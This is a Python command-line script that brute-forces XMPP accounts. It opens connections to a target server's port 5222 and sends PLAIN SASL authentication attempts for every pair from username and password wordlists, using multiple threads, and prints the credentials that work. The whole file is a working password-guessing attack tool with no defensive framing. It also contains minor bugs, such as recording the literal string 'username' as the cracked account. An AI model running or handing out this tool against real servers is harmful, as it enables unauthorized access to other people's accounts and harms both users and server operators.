#!/usr/bin/python3

import socket
import sys
import time
import base64
import argparse
import concurrent.futures

def file_read(filename):
    file=open(filename, 'r')
    internals=file.readlines()
    file.close()
    return internals

def connect(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (host, port)
    sock.connect(server_address)
    return sock

def xmpp_init():
    sock = connect(args.host, 5222)
    # Stream init
    if args.server_name != '':
        message=f"<stream:stream to='{args.server_name}' xmlns='jabber:client' " \
            "xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
    else:
        message=f"<stream:stream xmlns='jabber:client' " \
            "xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
    
    sock.send(message.encode())
    initial_data = sock.recv(1024)
    if "<stream:error" in initial_data.decode():
        print("Error: XMPP improper-addressing (--server-name option is required)")
        sys.exit()
    
    if "<stream:features>" in initial_data.decode():
        if not "PLAIN" in initial_data.decode():
            print("Error: PLAIN authentification is not supported")
            sys.exit()
    else:
        features = sock.recv(1024)
        if not "PLAIN" in features.decode():
            print("Error: PLAIN authentification is not supported")
            sys.exit()
    return sock

cracked_usernames=[]

def bruteforce(username, password):
    sock = xmpp_init()
    # Generate authentification string in PLAIN format
    username=username.strip()
    password=password.strip()
    auth_string=f"\x00{username}\x00{password}"
    auth_string_base64=base64.b64encode(auth_string.encode()).decode()
    
    # Check if username is already cracked
    if username in cracked_usernames:
        return
    
    # Trying authentificate
    message=f"<auth mechanism='PLAIN' xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>" \
            f"{auth_string_base64}</auth>"
    sock.send(message.encode())
    auth_response=sock.recv(1024)
    if "<success" in auth_response.decode():
        print(f"{username} {password} - success")
        cracked_usernames.append("username")
    elif "<not-authorized" in auth_response.decode():
        if args.debug:
            print(f"{username} {password} - not authorized")
    else:
        print(f"{username} {password} - something went wrong")

def arguments_parsing ():
    parser = argparse.ArgumentParser(description="XMPP brutefroce")
    parser.add_argument("-p", "--passwords", action="store", help="Passwords file")
    parser.add_argument("-u", "--usernames", action="store", help="Usernames file")
    parser.add_argument("-t", "--threads", action="store", help="Number of threads (Default: 1)")
    parser.add_argument("-s", "--server-name", action="store", help="Optional. Is " \
            "required to direct the stream to the appropriate server (is not checked " \
            "by some XMPP server implementation)", default='')
    parser.add_argument("-d", "--debug", action="store_true", help="Usernames file")
    parser.add_argument('host', metavar='HOST', type=str, help='Target IP address')

    return parser.parse_args()

args = arguments_parsing()
usernames=file_read(args.usernames)
passwords=file_read(args.passwords)

# Check if brutefroce can be done
xmpp_init()

# Concurent execution
with concurrent.futures.ThreadPoolExecutor(max_workers=int(args.threads)) as executor:
    for password in passwords:
        for username in usernames:
            executor.submit(executor.submit(bruteforce, username, password))
